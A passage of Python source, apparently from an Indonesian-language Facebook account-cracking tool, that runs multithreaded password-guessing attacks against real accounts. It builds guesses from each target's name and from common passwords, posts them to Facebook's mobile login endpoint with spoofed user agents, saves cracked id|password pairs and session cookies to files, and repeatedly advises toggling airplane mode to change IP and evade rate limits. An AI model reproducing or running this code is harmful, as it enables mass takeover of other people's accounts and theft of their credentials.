		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				nam = nmf.split(' ')
				if "S" in pass_tipe:
					if len(nam) == 2 or len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345"]
					elif len(nam) == 6:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345"]
					else:
						pwv = ['sayang','akusayangkamu','bagong','katasandi','123456','loveyou','bagong','bismillah','anjing','katasandi','password','facebook','bajingan']
				elif "C" in pass_tipe:
					if len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
					else:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
				pool.submit(crack3,idf,pwv)
	elif hc in ['4','04']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				nam = nmf.split(' ')
				if "S" in pass_tipe:
					if len(nam) == 2 or len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345"]
					elif len(nam) == 6:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345"]
					else:
						pwv = ['sayang','akusayangkamu','bagong','katasandi','123456','loveyou','bagong','bismillah','anjing','katasandi','password','facebook','bajingan']
				elif "C" in pass_tipe:
					if len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
					else:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
				pool.submit(crack,idf,pwv)
	elif hc in ['5','05']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				nam = nmf.split(' ')
				if "S" in pass_tipe:
					if len(nam) == 2 or len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345"]
					elif len(nam) == 6:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345"]
					else:
						pwv = ['sayang','akusayangkamu','bagong','katasandi','123456','loveyou','bagong','bismillah','anjing','katasandi','password','facebook','bajingan']
				elif "C" in pass_tipe:
					if len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
					else:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
				pool.submit(crack4,idf,pwv)
	elif hc in ['6','06']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				nam = nmf.split(' ')
				if "S" in pass_tipe:
					if len(nam) == 2 or len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345"]
					elif len(nam) == 6:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345"]
					else:
						pwv = ['sayang','akusayangkamu','bagong','katasandi','123456','loveyou','bagong','bismillah','anjing','katasandi','password','facebook','bajingan']
				elif "C" in pass_tipe:
					if len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
					else:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
				pool.submit(crack5,idf,pwv)
	print("")
	tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
	sol().print(mark(tanya, style='green'))
	woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()
def __Manual__():
	met = '# SILAHKAN MASUKAN KATASANDI'
	sol().print(mark(met, style='green'))
	tap = me()
	asu = 'Semakin Banyak Password Yang Di Buat\nMaka Semakin Banyak Data Yang DiKeluarkan'
	cetak(nel(asu, title=''))
	pwek=input(' [?] Katasandi : ')
	if pwek=="":
		met = '# ISI DENGAN BENAR'
		sol().print(mark(met, style='white'))
		tap = me()
	elif len(pwek)<=6:
		met = '# MINIMAL KATASANDI > 6'
		sol().print(mark(met, style='white'))
		tap = me()
	met = '# PILIH METHOD CRACK'
	sol().print(mark(met, style='green'))
	tap = me()
	tap.add_column('NO', style='red', justify='center')
	tap.add_column('METHODE', style='yellow', justify='center')
	tap.add_row('[01]',' Method Api [NOT RECOMMENDED]')
	tap.add_row('[02]',' Method Mbasic [RECOMMENDED V1]')
	tap.add_row('[03]',' Method Mobile [RECOMMENDED V2]')
	tap.add_row('[04]',' Method Mobile [RECOMMENDED V3]')
	tap.add_row('[05]',' Method Mobile [RECOMMENDED V4]')
	tap.add_row('[06]',' Method Mobile [RECOMMENDED V5]')
	sol().print(tap, justify='center')
	hc = input(x+'['+p+'f'+x+'] Pilih : ')
	if hc in ['1','01']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				pool.submit(api,idf,pwek.split(","))
	elif hc in ['2','02']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				pool.submit(crack2,idf,pwek.split(","))
	elif hc in ['3','03']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				pool.submit(crack3,idf,pwek.split(","))
	elif hc in ['4','04']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				pool.submit(crack,idf,pwek.split(","))
	elif hc in ['5','05']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				pool.submit(crack4,idf,pwek.split(","))
	elif hc in ['6','06']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				pool.submit(crack5,idf,pwek.split(","))
	print("")
	tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
	sol().print(mark(tanya, style='green'))
	woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()
		
def __Gabung__():
	met = '# SILAHKAN MASUKAN KATASANDI'
	sol().print(mark(met, style='green'))
	tap = me()
	asu = 'Semakin Banyak Password Yang Di Buat\nMaka Semakin Banyak Data Yang DiKeluarkan'
	cetak(nel(asu, title=''))
	pwek=input(' [?] Katasandi : ')
	if pwek=="":
		met = '# ISI DENGAN BENAR'
		sol().print(mark(met, style='white'))
		tap = me()
	elif len(pwek)<=6:
		met = '# MINIMAL KATASANDI > 6'
		sol().print(mark(met, style='white'))
		tap = me()
	met = '# PILIH METHOD CRACK'
	sol().print(mark(met, style='green'))
	tap = me()
	tap.add_column('NO', style='red', justify='center')
	tap.add_column('METHODE', style='yellow', justify='center')
	tap.add_row('[01]',' Method Api [NOT RECOMMENDED]')
	tap.add_row('[02]',' Method Mbasic [RECOMMENDED V1]')
	tap.add_row('[03]',' Method Mobile [RECOMMENDED V2]')
	tap.add_row('[04]',' Method Mobile [RECOMMENDED V3]')
	tap.add_row('[05]',' Method Mobile [RECOMMENDED V4]')
	tap.add_row('[06]',' Method Mobile [RECOMMENDED V5]')
	sol().print(tap, justify='center')
	hc = input(x+'['+p+'f'+x+'] Pilih : ')
	if hc in ['1','01']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				nam = nmf.split(' ')
				if "S" in pass_tipe:
					if len(nam) == 2 or len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345",pwek.split(",")]
					else:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345",pwek.split(",")]
				elif "C" in pass_tipe:
					if len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
					else:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
				pool.submit(api,idf,pwv)
	elif hc in ['2','02']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				nam = nmf.split(' ')
				if "S" in pass_tipe:
					if len(nam) == 2 or len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345",pwek.split(",")]
					else:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345",pwek.split(",")]
				elif "C" in pass_tipe:
					if len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
					else:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
				pool.submit(crack2,idf,pwv)
	elif hc in ['3','03']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				nam = nmf.split(' ')
				if "S" in pass_tipe:
					if len(nam) == 2 or len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345",pwek.split(",")]
					else:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345",pwek.split(",")]
				elif "C" in pass_tipe:
					if len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
					else:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
				pool.submit(crack3,idf,pwv)
	elif hc in ['4','04']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				nam = nmf.split(' ')
				if "S" in pass_tipe:
					if len(nam) == 2 or len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345",pwek.split(",")]
					else:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345",pwek.split(",")]
				elif "C" in pass_tipe:
					if len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
					else:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
				pool.submit(crack,idf,pwv)
	elif hc in ['5','05']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				nam = nmf.split(' ')
				if "S" in pass_tipe:
					if len(nam) == 2 or len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345",pwek.split(",")]
					else:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345",pwek.split(",")]
				elif "C" in pass_tipe:
					if len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
					else:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
				pool.submit(crack4,idf,pwv)
	elif hc in ['6','06']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				nam = nmf.split(' ')
				if "S" in pass_tipe:
					if len(nam) == 2 or len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345",pwek.split(",")]
					else:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345",pwek.split(",")]
				elif "C" in pass_tipe:
					if len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
					else:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
				pool.submit(crack5,idf,pwv)
	print("")
	tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
	sol().print(mark(tanya, style='green'))
	woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()

	
# CRACKER2
proses = "[MOHON TUNGGU]"
def crack2(idf,pwv,**data):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	for wk in list('\|-/'):
		print(f'\r%s{wk} {N}%s/%s OK/%s CP/%s <•> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			ua = random.choice([
					"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
					"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
				])
			headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'checkpoint' in ses.cookies.get_dict():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\r%s╚══ %s|%s           '%(K,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif 'c_user' in ses.cookies.get_dict():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print('\r%s╚══ %s|%s           '%(H,idf,pw))
